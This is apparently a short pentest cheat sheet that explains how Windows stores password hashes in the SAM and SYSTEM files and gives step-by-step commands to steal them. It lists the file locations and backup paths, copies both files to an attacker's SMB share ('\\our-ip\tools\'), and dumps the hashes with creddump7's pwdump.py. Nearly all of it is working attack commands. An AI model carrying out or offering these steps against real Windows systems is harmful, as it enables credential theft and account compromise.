- - -
Windows stores password hashes in the **Security Account Manager** (**SAM**).
The hashes are **encrypted with a key** which can be found in a file named **SYSTEM**.

If you have ability to read the SAM and SYSTEM Files You can extract the hashes.


The SAM and SYSTEM files are located in the :

`"C:\Windows\System32\config"` directory

The files are locked while Windows is running.

BackUps of these files may be found in the : 

`"C:\Windows\Repair”`  **or**  `“C:\Windows\System32\config\RegBack"` directories.

If the Files Found Copy those files to kali then analysing it will be better.

```
copy C:\path\to\SAM \\our-ip\tools\
```

```
copy C:\path\to\SYSTEM \\our-ip\tools\
```

##### What Now ?? 

```sh
git clone https://github.com/Neohapsis/creddump7.git ;  cd creddump7/
```

```python
python2 pwdump.py /path/to/SYSTEM /path/to/SAM
```

- - -

